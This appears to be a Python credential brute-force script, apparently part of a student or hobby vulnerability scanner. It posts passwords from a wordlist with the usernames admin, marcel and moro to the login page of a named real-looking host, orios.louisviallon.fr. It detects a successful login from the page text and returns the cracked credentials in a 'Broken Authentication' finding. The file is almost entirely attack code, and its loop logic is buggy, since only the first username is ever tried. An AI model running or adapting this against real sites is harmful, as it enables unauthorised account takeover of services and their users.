import requests
import os
from progessbar import printProgressBar

class TestLog():
    url = "http://orios.louisviallon.fr/login.php"
    count = 0
    username = ""
    password = ""

    def Testing(self, password):
        usernames = ["admin", "marcel", "moro"]
        for username in usernames:
            data = {
                'login': username,
                'status':'1',
                'password': password.rstrip(),
            }
            r = requests.post(self.url, data = data)
            page = r.text
            if page.find("déconnecter") != -1:
                self.username = username
                self.password = password
                return True
            else:
                self.count += 1
                printProgressBar(self.count, 3000, prefix = 'Progress:', suffix = 'Complete', length = 35)
                return False

    def readfiles(self):
        f = open("password.txt","r")
        f1 = f.readlines()
        for password in f1:
            if self.Testing(password) == True:
                return True
        return False

    def Launch(self):
        if testlog.readfiles() == True:
            print (self.make_pdf())
            return (self.make_pdf())
        else: 
            pass

    def make_pdf(self):
        dictionnaire = {
            'Broken Authentification': {
                'data': {
                    'url': self.url,
                    'msg': 'Le site est vulnérable à la faille A2 Broken Authentification',
                    'username': self.username,
                    'password': self.password.rstrip()
                }
            }
        }
        return dictionnaire

testlog = TestLog()
testlog.Launch()